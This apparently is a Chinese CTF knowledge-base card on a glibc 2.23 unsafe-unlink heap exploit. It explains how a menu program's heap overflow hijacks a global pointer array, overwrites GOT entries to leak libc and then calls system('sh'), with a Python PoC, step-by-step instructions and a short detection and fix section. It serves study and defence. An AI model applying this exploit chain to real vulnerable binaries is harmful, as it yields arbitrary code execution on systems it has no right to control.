---
id: binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system
title: glibc 2.23 unsafe unlink：伪造 chunk 劫持 chunks 数组后 GOT 泄露与 system 覆写
type: scenario
domain: binary
path: binary/pwn/heap
technique: unsafe-unlink-chunks-array-got-system
aliases:
- unsafe unlink
- 伪造 chunk
- chunks 数组劫持
- free@got 改 puts@plt
- glibc 2.23 堆
- DeepVoid
tags:
- pwn
- heap
- unsafe-unlink
- glibc223
- got
- libc-leak
- system
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:21:36+08:00'
  notes: 已对照原文与图06-09核对：modify_content 固定 read 0x200、0x80 chunk 伪造 fd/bk=chunks-0x18/chunks-0x10、free 触发 unsafe unlink、改 chunks[1]=free@got/chunks[2]=puts@got、free@got=puts@plt 泄露、再改 system 并 free sh chunk、远端只允许 system(sh)，实测 ISCC{a521640c-...} 均与卡片一致。原 affected_versions=glibc 2.23 为题目环境版本，按 brief 已 --clear。未验证点：PoC 未本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

`modify` 对任意已分配 chunk 固定 `read(0, ptr, 0x200)` 造成堆溢出；伪造 chunk 的 `fd/bk` 为 `chunks-0x18`/`chunks-0x10`，free 相邻 chunk 触发 unsafe unlink 把全局 `chunks` 指针数组改写到 GOT 附近；再把 `chunks[1]`/`chunks[2]` 指向 `free@got`/`puts@got`，改 `free@got=puts@plt` 泄露 libc，最后改 `free@got=system` 并 free 一个内容为 `sh` 的 chunk 起 shell。

## 原理

- **溢出点**：`modify_content` 取 `chunks[idx]` 后固定 `mov edx, 0x200; call read@plt`，不记录目标 chunk 的真实大小；申请 0x80 的小 chunk 也能向后覆盖相邻 chunk 头。
- **unsafe unlink**：glibc 2.23 的 `unlink` 宏执行 `FD->bk = BK; BK->fd = FD`，没有 2.27+ 的 `FD->bk == P && BK->fd == P` 检查。把 fake chunk 的 `fd`/`bk` 设为 `chunks-0x18`/`chunks-0x10`，free 时就会把 `chunks` 数组内容改写成可控指针。
- **数组劫持**：`chunks` 是 .bss 固定地址的全局指针数组；unlink 后 `chunks[0]`/`chunks[1]` 被写成 fake 指针，再用 `modify(0)` 覆盖数组，把 `chunks[1]` 指向 `free@got`、`chunks[2]` 指向 `puts@got`。
- **GOT 泄露与覆写**：Partial RELRO 下 GOT 可写；`modify(1, p64(puts@plt))` 把 `free@got` 改成 `puts@plt`，`remove(2)` 实际调用 `puts(puts@got)` 泄露 libc；再把 `free@got` 改成 `system`，free 内容为 `sh` 的 chunk 即执行 `system("sh")`。
- **远端限制**：题目只允许 `system("sh")` 或 `system("/bin/sh")`，不能直接把 `cat /flag` 当参数；先起 shell，再在同一连接里发读旗命令。

## 触发条件

- glibc 2.23（或未引入 unlink 完整性检查的旧版本）。
- No PIE、Partial RELRO，`chunks` 数组地址固定、GOT 可写。
- 存在可控堆溢出覆盖相邻 chunk 头，且程序 free 时不校验 `prev_inuse` 之外的元数据。
- 有 create/modify/remove 菜单，能按索引操作 chunk。

## 利用步骤

1. `file`/`checksec` 确认 amd64、No PIE、Partial RELRO；反汇编 `modify_content` 确认固定 `read 0x200`。
2. 申请 3 个 0x80 chunk；`modify(0)` 写入 fake chunk（`prev_size=0`、`size=0x80`、`fd=chunks-0x18`、`bk=chunks-0x10`），并把 chunk1 的 `prev_size`/`size` 改成 `0x80/0x90`。
3. `remove(1)` 触发 unlink，`chunks` 数组被改写。
4. `modify(0)` 重写数组：`chunks[1]=free@got`、`chunks[2]=puts@got`。
5. `modify(1, p64(puts@plt))` 改 `free@got`；`remove(2)` 调用 `puts(puts@got)`，从输出解析 libc 基址。
6. 计算 `system = libc_base + system_off`；`modify(1, p64(system))` 改 `free@got`。
7. 新建 chunk 写入 `sh\0`，`remove` 该 chunk 触发 `system("sh")`，再发送 `cat /flag*` 等命令。

## PoC

```python
CHUNKS, FREE_GOT, PUTS_GOT, PUTS_PLT = 0x6020C0, 0x602018, 0x602020, 0x4006D0

def build_unlink_payload():
    p = p64(0) + p64(0x80) + p64(CHUNKS - 0x18) + p64(CHUNKS - 0x10)
    return p.ljust(0x80, b"A") + p64(0x80) + p64(0x90)

def rewrite_chunks_payload():
    return b"B" * 0x18 + p64(CHUNKS - 0x18) + p64(FREE_GOT) + p64(PUTS_GOT)

create(0, 0x80); create(1, 0x80); create(2, 0x80)
modify(0, build_unlink_payload()); remove(1)
modify(0, rewrite_chunks_payload()); modify(1, p64(PUTS_PLT)); remove(2)
puts_leak = u64(recv_line()[:8]); libc_base = puts_leak - PUTS_OFF
modify(1, p64(libc_base + SYSTEM_OFF))
create(3, 0x80); modify(3, b"sh\0"); remove(3)
```

## 变体与关联

- **版本变体**：glibc 2.27+ 的 unlink 检查会阻止本链，需改用 tcache/fastbin dup、House of 系列；2.23 也可能有 `prev_size` 校验。
- **目标变体**：可改 `__free_hook`/`__malloc_hook` 或 `.fini_array`；若有 Full RELRO 则不能改 GOT，需要写 hook 或返回地址。
- **关联卡片**：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（同版本 unsorted bin 泄露）、[[binary-pwn-heap-delete-compaction-stale-slot-fastbin-dup]]（旧版 fastbin dup 打 GOT）、[[binary-pwn-heap-uaf-function-pointer-hijack]]（UAF 改回调）。
- **边界**：`chunks` 数组地址与 GOT 偏移随二进制变化；若 free 前有 size 校验或 safe-unlink，本链不成立。

## 检测与防御

- **CTF 验证**：unlink 后先确认 `chunks[1]` 指向 `free@got`，再确认 `remove(2)` 输出的是 libc 地址而非崩溃；最后确认 `system("sh")` 能交互。
- **修复**：升级 glibc 到带 unlink 完整性检查的版本；开启 Full RELRO/PIE；`modify` 记录并校验 chunk 大小；free 后置空指针。
- **检测信号**：堆块头 `fd/bk` 指向全局数组附近；free 后 GOT 出现异常写入；菜单程序出现非预期 `system` 调用。
